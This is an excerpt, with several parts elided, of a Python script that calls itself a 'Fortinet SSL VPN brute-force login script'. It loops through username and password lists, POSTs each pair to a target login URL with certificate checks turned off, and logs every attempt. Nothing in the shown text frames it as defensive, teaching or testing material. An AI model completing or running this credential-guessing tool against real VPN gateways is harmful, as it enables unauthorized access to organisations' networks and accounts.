...
def try_login(target_url, username, password):
    try:
       ...
       robot = requests.post(target_url, data=data, verify=False, timeout=5)
...
def main(target_server, user_file, pass_file):
    ...
    for username in usernames:
        for password in passwords:
            log_attempt(username, password, "ATTEMPT", "Trying login")
...
def parse_args():
    parser = argparse.ArgumentParser(description="Fortinet SSL VPN brute-force login script")
    parser.add_argument(
        "--targetservername",
        required=True,
